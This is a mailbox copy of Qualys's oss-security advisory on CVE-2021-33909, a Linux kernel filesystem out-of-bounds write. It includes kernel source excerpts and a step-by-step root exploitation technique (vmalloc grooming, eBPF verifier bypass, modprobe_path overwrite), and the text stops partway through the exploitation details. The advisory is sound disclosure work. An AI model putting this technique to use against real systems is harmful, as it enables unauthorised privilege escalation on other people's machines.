X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["30673" "Tuesday" "20" "July" "2021" "12:36:11" "+0000" "Qualys Security Advisory" "qsa@qualys.com" nil "617" "[oss-security] CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem layer" nil nil nil "7" nil nil (number mark "U       qsa@qualys.c Jul 20  617/30673 " thread-indent "\"[oss-security] CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem layer\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem layer" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11596 invoked by uid 550); 20 Jul 2021 12:36:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11572 invoked from network); 20 Jul 2021 12:36:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
 date : message-id : content-type : mime-version; s=qualyscom;
 bh=TUANWcrBKMpOWdgeRYa9KZdEyQ0cxnf4fwhxioeGETo=;
 b=dTnEcVuxwjpQ6jftyK3rdWoC+j0+Rl8djdnazdgwpXFTBNauXGOoWK8s7JwydaU6IWmi
 49hk54H+QX78jBwPZtJCLFQV/JILJLgkofJGqPM1Mv9niDO7voGkDkfo2HQqlmhnK9SL
 NfYSqGoO37NHwmf8gwP0QaPJwSkRIyupBLD/KVrIeBkgSO8Kr4FX1YgVUSjkAq2sr6U8
 t4gyVVy/ZDZ3QAHBkNOAW2t9oQSkV5D5ZiHcBe/FoprDw9TrEuY+AO/tTJSvSbWBq0u2
 ydUhSZiYeg+sCcNY7Y+NgPAcXmpZWPgoLbOXe1QN9QsnkHwJO1YGcSvvJ9vy1r9WE3xo bQ== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=HgghHroNWWnVPONk6Qgss7ztwRvgDOyFVU4r75nt91lLlWUO1XxIUUBWGZpvMVjC+cdte3VRC4mflBBa9lDTPiNbutrmadR8lSalYQl/I8nfoMTYq12REfjaTdn+x7PcBtYaiWXnm0v5WkEkaCa2oX4zxX4GyDE1JvGy/EuW7CndeIi9PNtf/wtDVrZOO3pTxFf27GJe1tcEbuwrHhrC1AgDDaYW6DayBB+38X2T+w2HqSRsZ46mSTu9qf88WSWnEXNbUe4/9SAuCgJOTKVwNK0A42P6gtBrnPK8JSCuTDJ2KyOpOuNEFB5Ht5xYkF2Dy0Eiolxrbo+Eh9fuqQGNuQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=TUANWcrBKMpOWdgeRYa9KZdEyQ0cxnf4fwhxioeGETo=;
 b=DG1xnvMbVEzcuE1hpEKRmSQAsANvjYMFnbJmz0XlUQvoVhTGrya8h9XUYeZV7LnE2xWbQLsOU2aJgKA22EdCQwwZI0rM7/VQubygin8kHs2pzVDvLV+V3lnaCv9kGPZKFR9DxAzMfezfQ9oEpOdmMFvEsqxJd0OcrRUX2Fn+0XPhxk7JuWDd2pImeTlfHLE8rky16qdUIbTJiWNEjiRd0wl86qm9LlDdlnFWp30sTSJWk5U4V9rSHGmjuBeug9VyMQ0tVbFJpThT2X3k/uoE+YGLRkjT4RhYaOTmU6Uxs1c1F+NSnYI9qZ9k+pRlswLXe6PGBCF5bzy0v6y1B62y2w==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=TUANWcrBKMpOWdgeRYa9KZdEyQ0cxnf4fwhxioeGETo=;
 b=vhk1vA5TzNI8xsWYC4el7LvutCnndOkYktLsFy2UleRvp0OzHFcT7r6L1X4VV2qIx3U5NU9LOXLghZqmwt6/Xm0KVQqJo80ybf8cD4Xg2b/bC7QKxTVBW0Q4URfi9MeQVky5OvVPRz/X4y3PNY3roN/MDeIyn7C50ZvWGyW8xGIWNVweolxDcXkGI9zquaFQDGE8A2YathhC7kDGWR4U05C+trhabMeThdnZPkGn1h8d2Ikv3mtRcFhXkFlRFFG7XmLKMqJeH/yEd88a/f7yExT74OzQ5zfKSEUB7qleICbWlhvz5tIaVMG5dVr36E+ycO58dr26LmWw9bhOrYKSKw==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2021-33909: size_t-to-int vulnerability in Linux's
 filesystem layer
Thread-Index: AQHXfWPSRskEqiLUSUGrQDKzFRqNJA==
Date: Tue, 20 Jul 2021 12:36:11 +0000
Message-ID: <20210720123335.GA19170@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator: 
authentication-results: lists.openwall.com; dkim=none (message not signed)
 header.d=none;lists.openwall.com; dmarc=none action=none
 header.from=qualys.com;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: e8d22272-ea91-4989-bbea-08d94b7af4ed
x-ms-traffictypediagnostic: BYAPR06MB5560:
x-microsoft-antispam-prvs: 
 <BYAPR06MB55605BC6426610245A2AA316D5E29@BYAPR06MB5560.namprd06.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:229;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 urCRx3ZJItFqHonpgJRlrMV1lyoIwoODLezkQ4M6BdrWQQArZD0PR7cQ34TnwIJbO9X4yEgNXJiBOI/SMhFqYLVJt7h1MgvGzmv1aPj/a31R7OS4vZHsgPk0wS8cX+aVjMj0quNWQWsygrpVAP4Fx6Ur2sOc19yktoi13hITMZBvHZDsVlyiqtqhrIGc62py5x1qr+QTAHgXGx0LwE1eiBS6eo9wp9GdxDN2hRmcWhndubZ5GWbww+AzQSs4aJm4DIxvKLwiNYj/fQgmgIxwem+j7U5KI+SXXbFG106+t4bRwao2FzwB50IgXFBsFKDgg5fexfAJxNvaWss2SCbGlHOzy1GqDIZtUX3Vjzi5K0YRDUUqROqt6viYmHcB46FjoA2ith1gcc1JxhsbEbslNsIcr1daBE0carobgdv2GOrYNAH+rIKyOoQDdlRItQ15B7mMlE3WMYXawo1boXORXgFkHKk6+PwUCZzfUD/u9wEbOc5Uo0ghJNR/iByiTPi9hsrYIImT6g0pWrp+wndiiG07ghW/Wy/Or/1alv0NpOIdvdKLv71OlvTgPbxyII2y6tc/864FIMRt0e4hLUxRupAXwmG9wG6TStZL5/2Up+m6plmSvbvy15FizH+AuzbrGYFQ8f0jrxVQLJURNOWdSSa0LrF2b2OCAnAUVZPMORpBilyJhM717WTbgzV+UnS2eZQuXncoo8quoDmqt3+/HDfJ5y5OEWJkDKu3Q7OWD01OXgQgr/bjF6EeDxb9f0sY1WCH1r9FjtEt/HTec81lt9UTgGz0z2XQaIwMWu6BRToZb+B57D5xtkoixxTIpB6+fm7MmAsdsBJjWx3Z47q/Xsb3ajkSKD1ZDqXYqbV94O0=
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(39860400002)(396003)(376002)(136003)(346002)(366004)(66616009)(66946007)(478600001)(76116006)(66556008)(8676002)(9686003)(8936002)(71200400001)(99936003)(83380400001)(64756008)(66446008)(66476007)(30864003)(86362001)(6512007)(6486002)(33656002)(5660300002)(26005)(122000001)(966005)(6916009)(316002)(2906002)(38100700002)(6506007)(1076003)(186003)(21314003)(38070700004);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?us-ascii?Q?zc5OzSBpxSCmzbRl2Hkgb8mUDY1ZlqNezB1C5Jdxkd8XTad0gbu2WdYkn7fE?=
 =?us-ascii?Q?78xzMaiUeIlJELXpjQKbKG/OUZpwnwmiKy1gHwOtHU0XxgCfbaazo0yvM5KR?=
 =?us-ascii?Q?/RmBZnyvKnJULA57v5ErHRnxL8qC9h59L+TtNbnQBrrcogZMBWDcMkIzm1ge?=
 =?us-ascii?Q?1F5vp/90stwySOxxkSWBxJ06WkK/VYoWtb6McunuARF7c5iB+loJapodzCTj?=
 =?us-ascii?Q?nyZDGvX46qGgGuO6WnpZ5c6+zMGPQFoIV7tslkY8KcTMH3jzZWH5yWnSkvCh?=
 =?us-ascii?Q?PEBjDzowTEgzOhlJFGr0S+Z5crt0/QUbDmZY3ZgYaDirUmVpLpG9O17edBaF?=
 =?us-ascii?Q?oeObAw7oMGb9aTBA8R14IlILrA/CsYslmfU0Lth8M8DNFDZ6yxvpuPvkemV5?=
 =?us-ascii?Q?uWaW68F2FP3XO0OgYM2jfyK1cFtmd3bk0TmGBO2x71N8Tj+dpdByhyJn9qYp?=
 =?us-ascii?Q?qR7tnjnyHOkCi0+E4+e8+r0x95i9LnnSrY2J3YealjfVFHLtXaqaFyg4SHUP?=
 =?us-ascii?Q?kXxzz1bWPtHzyQoyGgI/x3TdmlLHc2KRNhioyqf1CoXOUwZyCiS11TdxR09Q?=
 =?us-ascii?Q?ftvOcJVdaogPwBBdCSMl2vbej1qggamynan2T8EoLZqdJnhz53aIgxs1Yrjz?=
 =?us-ascii?Q?bfUJZ+JVgolYhhLR1/rjpaiF6RZArQEIXxO5qUfVMGVEKKaN1zACUVSqf+Hm?=
 =?us-ascii?Q?CyWN2Ou0kxRpCxcjA0L0BLV82y+qIC/yX7e/zRVBdmH7J2NzYHfV2fEIWRBp?=
 =?us-ascii?Q?tpVAUwvEM/4naESZyRgnFPMitC8ptUurOSQvjoyIKuFHAtVEieGnnenb+VSw?=
 =?us-ascii?Q?EDKjlxU/xJTnj/mgMAoPAOXGEaKFAHBmDssT5GZb5KdPpzjBwsR2XpUHeE2/?=
 =?us-ascii?Q?Y4T09N/eDJc3rAYLsn8ft2YV4phTC1zyVLBims/UbxU8YZZKgPwc7j5V7uup?=
 =?us-ascii?Q?3CaxUL0Edgo3UNg68LRUa7M9DxI84emvvpe8C6ZLi1UgO+KxBcdoSuw+RRLu?=
 =?us-ascii?Q?Cxv6SUChfUg/mvFuc9HyebLUTNRHJ0L148PK//kkn53+8kqJsRS8wuWzyBsn?=
 =?us-ascii?Q?nvDeQvfXxrVrMd8JSb/M9Q1K3f6jH6DWKdif8E8wMvD3CXI3NX/RkZZW0/nA?=
 =?us-ascii?Q?uqwwOktY26HbrgTuFGjTfCLH7os4Gl8mhslNFkDkl+Z1d5pcoRxPvwRs2UWX?=
 =?us-ascii?Q?F6N/BJQ8stmX72VUiWMrrkVkZx0eAOHsD+ItaKoSUNT+4fYGqePRli9Uz6ZH?=
 =?us-ascii?Q?5cGujKPbBGxPA5/ojxZqvsOqNgIDPp4wJlBXqsOv/ZuL9Su6gl/23zqKh24Q?=
 =?us-ascii?Q?vC3az88n85yhJXtB9MyFlanU9C7GYYtJdhPI4bBXNNFr/w=3D=3D?=
x-ms-exchange-transport-forked: True
Content-Type: multipart/mixed;
	boundary="_002_20210720123335GA19170localhostlocaldomain_"
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: e8d22272-ea91-4989-bbea-08d94b7af4ed
X-MS-Exchange-CrossTenant-originalarrivaltime: 20 Jul 2021 12:36:11.5924
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: EvdD811RbiB3H+z3p6RJLRzH2suyB27s7dsMNF8Bre1DWb7Gsc+EXShhjKpsV1eWK8YMsCe/rDtjy+qBrKKKa8ZFD8Fk7bn5DLIiBTmV+RE=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BYAPR06MB5560
X-Proofpoint-GUID: ufwv3aYxxoYhhyKcGLlrG-yx8EgQXms5
X-Proofpoint-ORIG-GUID: ufwv3aYxxoYhhyKcGLlrG-yx8EgQXms5
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:_spf.salesforce.com include:emailus.freshservice.com
 include:mktomail.com ~all
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.182.1,Aquarius:18.0.790,Hydra:6.0.391,FMLib:17.0.607.475
 definitions=2021-07-20_07,2021-07-19_01,2020-04-07_01
X-Proofpoint-Spam-Details: rule=inbound_notspam policy=inbound score=0 mlxlogscore=999 clxscore=1034
 phishscore=0 impostorscore=0 priorityscore=1501 suspectscore=0 bulkscore=0
 mlxscore=0 spamscore=0 malwarescore=0 lowpriorityscore=0 adultscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2107140000
 definitions=main-2107200081
Subject: [oss-security] CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem
 layer

--_002_20210720123335GA19170localhostlocaldomain_
Content-Type: text/plain; charset="us-ascii"
Content-ID: <F259D8A0705DAB40AD15D4EC3DEA3D57@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable


Qualys Security Advisory

Sequoia: A deep root in Linux's filesystem layer (CVE-2021-33909)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Analysis
Exploitation overview
Exploitation details
Mitigations
Acknowledgments
Timeline


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We discovered a size_t-to-int conversion vulnerability in the Linux
kernel's filesystem layer: by creating, mounting, and deleting a deep
directory structure whose total path length exceeds 1GB, an unprivileged
local attacker can write the 10-byte string "//deleted" to an offset of
exactly -2GB-10B below the beginning of a vmalloc()ated kernel buffer.

We successfully exploited this uncontrolled out-of-bounds write, and
obtained full root privileges on default installations of Ubuntu 20.04,
Ubuntu 20.10, Ubuntu 21.04, Debian 11, and Fedora 34 Workstation; other
Linux distributions are certainly vulnerable, and probably exploitable.
Our exploit requires approximately 5GB of memory and 1M inodes; we will
publish it in the near future. A basic proof of concept (a crasher) is
attached to this advisory and is available at:

https://www.qualys.com/research/security-advisories/

To the best of our knowledge, this vulnerability was introduced in July
2014 (Linux 3.16) by commit 058504ed ("fs/seq_file: fallback to vmalloc
allocation").


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The Linux kernel's seq_file interface produces virtual files that
contain sequences of records (for example, many files in /proc are
seq_files, and records are usually lines). Each record must fit into a
seq_file buffer, which is therefore enlarged as needed, by doubling its
size at line 242 (seq_buf_alloc() is a simple wrapper around
kvmalloc()):

------------------------------------------------------------------------
 168 ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
 169 {
 170         struct seq_file *m =3D iocb->ki_filp->private_data;
 ...
 205         /* grab buffer if we didn't have one */
 206         if (!m->buf) {
 207                 m->buf =3D seq_buf_alloc(m->size =3D PAGE_SIZE);
 ...
 210         }
 ...
 220         // get a non-empty record in the buffer
 ...
 223         while (1) {
 ...
 227                 err =3D m->op->show(m, p);
 ...
 236                 if (!seq_has_overflowed(m)) // got it
 237                         goto Fill;
 238                 // need a bigger buffer
 ...
 240                 kvfree(m->buf);
 ...
 242                 m->buf =3D seq_buf_alloc(m->size <<=3D 1);
 ...
 246         }
------------------------------------------------------------------------

This size multiplication is not a vulnerability in itself, because
m->size is a size_t (an unsigned 64-bit integer, on x86_64), and the
system would run out of memory long before this multiplication overflows
the integer m->size.

Unfortunately, this size_t is also passed to functions whose size
argument is an int (a signed 32-bit integer), not a size_t. For example,
the show_mountinfo() function (which is called at line 227 to format the
records in /proc/self/mountinfo) calls seq_dentry() (at line 150), which
calls dentry_path() (at line 530), which calls prepend() (at line 387):

------------------------------------------------------------------------
135 static int show_mountinfo(struct seq_file *m, struct vfsmount *mnt)
136 {
...
150                 seq_dentry(m, mnt->mnt_root, " \t\n\\");
------------------------------------------------------------------------
 523 int seq_dentry(struct seq_file *m, struct dentry *dentry, const char *=
esc)
 524 {
 525         char *buf;
 526         size_t size =3D seq_get_buf(m, &buf);
 ...
 529         if (size) {
 530                 char *p =3D dentry_path(dentry, buf, size);
------------------------------------------------------------------------
380 char *dentry_path(struct dentry *dentry, char *buf, int buflen)
381 {
382         char *p =3D NULL;
...
385         if (d_unlinked(dentry)) {
386                 p =3D buf + buflen;
387                 if (prepend(&p, &buflen, "//deleted", 10) !=3D 0)
------------------------------------------------------------------------
 11 static int prepend(char **buffer, int *buflen, const char *str, int nam=
elen)
 12 {
 13         *buflen -=3D namelen;
 14         if (*buflen < 0)
 15                 return -ENAMETOOLONG;
 16         *buffer -=3D namelen;
 17         memcpy(*buffer, str, namelen);
------------------------------------------------------------------------

As a result, if an unprivileged local attacker creates, mounts, and
deletes a deep directory structure whose total path length exceeds 1GB,
and if the attacker open()s and read()s /proc/self/mountinfo, then:

- in seq_read_iter(), a 2GB buffer is vmalloc()ated (line 242), and
  show_mountinfo() is called (line 227);

- in show_mountinfo(), seq_dentry() is called with the empty 2GB buffer
  (line 150);

- in seq_dentry(), dentry_path() is called with a 2GB size (line 530);

- in dentry_path(), the int buflen is therefore negative (INT_MIN,
  -2GB), p points to an offset of -2GB below the vmalloc()ated buffer
  (line 386), and prepend() is called (line 387);

- in prepend(), *buflen is decreased by 10 bytes and becomes a large but
  positive int (line 13), *buffer is decreased by 10 bytes and points to
  an offset of -2GB-10B below the vmalloc()ated buffer (line 16), and
  the 10-byte string "//deleted" is written out of bounds (line 17).


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Exploitation overview
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

1/ We mkdir() a deep directory structure (roughly 1M nested directories)
whose total path length exceeds 1GB, we bind-mount it in an unprivileged
user namespace, and rmdir() it.

2/ We create a thread that vmalloc()ates a small eBPF program (via
BPF_PROG_LOAD), and we block this thread (via userfaultfd or FUSE) after
our eBPF program has been validated by the kernel eBPF verifier but
before it is JIT-compiled by the kernel.

3/ We open() /proc/self/mountinfo in our unprivileged user namespace,
and start read()ing the long path of our bind-mounted directory, thereby
writing the string "//deleted" to an offset of exactly -2GB-10B below
the beginning of a vmalloc()ated buffer.

4/ We arrange for this "//deleted" string to overwrite an instruction of
our validated eBPF program (and therefore nullify the security checks of
the kernel eBPF verifier), and transform this uncontrolled out-of-bounds
write into an information disclosure, and into a limited but controlled
out-of-bounds write.

5/ We transform this limited out-of-bounds write into an arbitrary read
and write of kernel memory, by reusing Manfred Paul's beautiful btf and
map_push_elem techniques from:

https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-e=
scalation-via-improper-ebpf-program-verification

6/ We use this arbitrary read to locate the modprobe_path[] buffer in
kernel memory, and use the arbitrary write to replace the contents of
this buffer ("/sbin/modprobe" by default) with a path to our own
executable, thus obtaining full root privileges.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Exploitation details
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

a/ We create a directory whose total path length exceeds 1GB: in theory,
we need to create over 1GB/256B=3D4M nested directories (NAME_MAX is 255);
in practice, show_mountinfo() replaces each '\\' character in our long
directory with the 4-byte string "\\134", and we therefore need to
create only 1M nested directories.

b/ We fill all large vmalloc holes: we bind-mount (MS_BIND) various
parts of our long directory in several unprivileged user namespaces and
vmalloc()ate large seq_file buffers by read()ing /proc/self/mountinfo.
For example, we vmalloc()ate 768MB of large buffers in our exploit.

c/ We vmalloc()ate two 1GB buffers and one 2GB buffer (by bind-mounting
our long directory in three different user namespaces, and by read()ing
/proc/self/mountinfo), and we check that "//deleted" is indeed written
to an offset of -2GB-10B below the beginning of our 2GB buffer (i.e.,
8182B above the beginning of our first 1GB buffer -- the "XXX"s are
guard pages):

        "//deleted"
             |
      4KB    v   1GB        4KB        1GB        4KB        2GB
-----|---|---+-------------|---|-----------------|---|-----------------|
 ... |XXX| seq_file buffer |XXX| seq_file buffer |XXX| seq_file buffer |
-----|---|---+-------------|---|-----------------|---|-----------------|
         |   |                                       |
         |   \----<----<----<----<----<----<----<----/
         8182B               -2GB-10B

d/ We fill all small vmalloc holes: we vmalloc()ate various small socket
buffers by send()ing numerous NETLINK_USERSOCK messages. For example, we
vmalloc()ate 256MB of small buffers in our exploit.

e/ We create 1024 user-space threads; each thread starts loading an eBPF
program into the kernel, but (via userfaultfd or FUSE) we block every
thread in kernel space (at line 2101), before our eBPF programs are
actually vmalloc()ated (at line 2162):

------------------------------------------------------------------------
2076 static int bpf_prog_load(union bpf_attr *attr, union bpf_attr __user *=
uattr)
2077 {
....
2100         /* copy eBPF program license from user space */
2101         if (strncpy_from_user(license, u64_to_user_ptr(attr->license),
....
2161         /* plain bpf_prog allocation */
2162         prog =3D bpf_prog_alloc(bpf_prog_size(attr->insn_cnt), GFP_USE=
R);
------------------------------------------------------------------------

f/ We vfree() our first 1GB seq_file buffer (where "//deleted" was
written out of bounds), and we immediately unblock all 1024 threads; our
eBPF programs are vmalloc()ated into the 1GB hole that we just vfree()d:

      4KB        1GB        4KB        1GB        4KB        2GB
-----|---|-----------------|---|-----------------|---|-----------------|
 ... |XXX|  eBPF programs  |XXX| seq_file buffer |XXX| seq_file buffer |
-----|---|-----------------|---|-----------------|---|-----------------|

g/ Next, (again via userfaultfd or FUSE) we block one of our threads (at
line 12795) after its eBPF program has been validated by the kernel eBPF
verifier but before it is JIT-compiled by the kernel:

------------------------------------------------------------------------
12640 int bpf_check(struct bpf_prog **prog, union bpf_attr *attr,
12641               union bpf_attr __user *uattr)
12642 {
.....
12795         print_verification_stats(env);
------------------------------------------------------------------------

h/ Last, we overwrite an instruction of this eBPF program with an
out-of-bounds "//deleted" string (again via our 2GB seq_file buffer),
and therefore nullify the security checks of the kernel eBPF verifier:

        "//deleted"
             |
      4KB    v   1GB        4KB        1GB        4KB        2GB
-----|---|---+-------------|---|-----------------|---|-----------------|
 ... |XXX|  eBPF programs  |XXX| seq_file buffer |XXX| seq_file buffer |
-----|---|---+-------------|---|-----------------|---|-----------------|
         |   |                                       |
         |   \----<----<----<----<----<----<----<----/
         8182B               -2GB-10B

First, we transform this uncontrolled eBPF-program corruption into an
information disclosure. Our first, uncorrupted eBPF program is deemed
safe by the kernel eBPF verifier ("storage" and "control" are two basic
BPF_MAP_TYPE_ARRAYs, readable and writable from user space via
BPF_MAP_LOOKUP_ELEM and BPF_MAP_UPDATE_ELEM):

- BPF_LD_IMM64_RAW(BPF_REG_2, BPF_PSEUDO_MAP_VALUE, storage) loads the
  address of our storage map (which resides in kernel space and whose
  address is unknown to us) into the eBPF register BPF_REG_2;

- BPF_MOV64_IMM(BPF_REG_2, 0) immediately replaces the contents of
  BPF_REG_2 (the address of our storage map) with the constant value 0;

- BPF_LD_IMM64_RAW(BPF_REG_3, BPF_PSEUDO_MAP_VALUE, control) loads the
  address of our control map into BPF_REG_3;

- BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_2, 0) stores the contents of
  BPF_REG_2 (the constant value 0) into our control map.

However, our eBPF-program corruption overwrites the instruction
BPF_MOV64_IMM(BPF_REG_2, 0) with the 8-byte string "deleted", which
translates into the instruction BPF_ALU32_IMM(BPF_LSH, BPF_REG_5, 0x74):
a NOP ("no operation"), because our program does not use BPF_REG_5. As a
result, we do not store the constant value 0 into our control map:
instead, we store and disclose the address of our storage map.

(This information disclosure allowed us to greatly reduce the number of
hardcoded kernel offsets in our exploit: our Ubuntu 20.04 exploit worked
out of the box on Ubuntu 20.10, Ubuntu 21.04, Debian 11, and Fedora 34.)

Second, we transform our uncontrolled eBPF-program corruption into a
limited but controlled out-of-bounds write. Our second, uncorrupted eBPF
program is also deemed safe by the kernel eBPF verifier ("corrupt" is a
3*64KB BPF_MAP_TYPE_ARRAY):

- BPF_LD_IMM64_RAW(BPF_REG_4, BPF_PSEUDO_MAP_VALUE, corrupt) loads the
  address of our corrupt map into BPF_REG_4;

- BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 3*64KB/2) points BPF_REG_4 to the
  middle of our corrupt map;

- BPF_ALU64_IMM(BPF_SUB, BPF_REG_4, 3*64KB/4) points BPF_REG_4 to the
  first quarter of our corrupt map;

- BPF_LD_IMM64_RAW(BPF_REG_3, BPF_PSEUDO_MAP_VALUE, control) loads the
  address of our control map into BPF_REG_3;

- BPF_LDX_MEM(BPF_H, BPF_REG_7, BPF_REG_3, 0) loads a variable 16-bit
  offset from our control map into BPF_REG_7;

